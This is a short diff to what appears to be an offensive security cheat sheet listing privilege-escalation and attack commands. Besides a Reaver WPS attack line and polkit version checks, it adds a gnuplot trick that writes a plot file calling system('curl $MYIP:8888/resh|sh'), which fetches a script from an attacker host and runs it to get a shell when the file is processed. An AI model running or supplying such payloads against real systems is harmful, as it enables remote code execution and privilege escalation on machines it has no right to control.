@@ -1418,6 +1418,9 @@ MOSH_KEY=llf0eFMPgMD7yZw7zgfkLw mosh-client 0.0.0.0 164
 iw dev
 reaver -i mon0 -b 02:00:00:00:00:00 -vv
 
++---------- Gnuplot ----------+
+echo 'system("curl $MYIP:8888/resh|sh")' > /opt/gnuplot/x.plt
+
 +---------- Polkit Version ----------+
 rpm -qa | grep -i polkit | grep -i "0.11[3-9]"
 apt list --installed 2>/dev/null | grep -i policykit
